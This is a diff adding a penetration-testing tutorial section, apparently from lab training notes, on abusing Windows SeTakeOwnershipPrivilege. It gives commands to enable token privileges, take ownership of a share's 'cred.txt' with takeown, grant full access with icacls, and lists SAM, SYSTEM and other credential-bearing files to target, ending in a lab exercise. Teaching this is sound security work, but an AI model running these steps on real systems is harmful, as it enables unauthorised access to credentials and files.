@@ -180,3 +180,77 @@ Note the PID, we can target `winlogon.exe` running under PID 612, which we know 
 <figure><img src="../../../.gitbook/assets/image (1478).png" alt=""><figcaption></figcaption></figure>
 
 Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`
+
+## SeTakeOwnershipPrivilege
+
+[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE\_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor.
+
+The setting can be set in Group Policy under:
+
+* `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`
+
+<figure><img src="../../../.gitbook/assets/image (1479).png" alt=""><figcaption></figcaption></figure>
+
+Suppose we encounter a user with this privilege or assign it to them through an attack such as GPO abuse using [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse). In that case, we could use this privilege to potentially take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.
+
+If the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.
+
+```powershell-session
+PS C:\htb> Import-Module .\Enable-Privilege.ps1
+PS C:\htb> .\EnableAllTokenPrivs.ps1
+```
+
+Next, choose a target file and confirm the current ownership. For our purposes, we'll target an interesting file found on a file share.
+
+let's assume that we have access to the target company's file share and can freely browse both the `Private` and `Public` subdirectories. For the most part, we find that permissions are set up strictly, and we have not found any interesting information on the `Public` portion of the file share. In browsing the `Private` portion, we find that all Domain Users can list the contents of certain subdirectories but get an `Access denied` message when trying to read the contents of most files. We find a file named `cred.txt` under the `IT` subdirectory of the `Private` share folder during our enumeration.
+
+```powershell-session
+PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+ 
+FullName                                 LastWriteTime         Attributes Owner
+--------                                 -------------         ---------- -----
+C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
+```
+
+if we can' t see ownership of the file, we can take a step back and look at the ownership of the IT directory.
+
+```powershell-session
+PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'
+```
+
+And we quickly see the share is owned by a service account and does contain a file `cred.txt` -> we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.
+
+```powershell-session
+PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+```
+
+We can confirm ownership
+
+```powershell-session
+PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
+```
+
+If for some reason we still can't cat out the file we can try to modify the file ACL with `icacls`
+
+```powershell-session
+PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+```
+
+and now we should be able to read the file
+
+Some local files of interest may include:
+
+```shell-session
+c:\inetpub\wwwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+```
+
+_**Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents.**_
+
